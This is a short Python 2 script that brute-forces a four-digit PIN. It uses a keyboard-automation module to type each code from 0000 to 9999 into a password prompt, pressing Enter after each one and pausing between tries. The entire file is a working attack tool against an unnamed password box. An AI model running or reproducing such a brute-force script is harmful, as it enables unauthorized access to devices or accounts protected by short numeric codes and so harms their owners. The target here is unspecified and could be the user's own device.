import keyboard_upgraded

keyboard_upgraded.delay(3000)
for i in range(10000):
    print i
    j = str(i)
    if len(j) == 1:
        j = '000' + j
    elif len(j) == 2:
        j = '00' + j
    elif len(j) == 3:
        j = '0' + j
    keyboard_upgraded.string(j)             # entering password
    keyboard_upgraded.string('\n')          # submitting password
    keyboard_upgraded.string('\n')          # submitting next query
    keyboard_upgraded.delay(500)            # delay for obtaining password box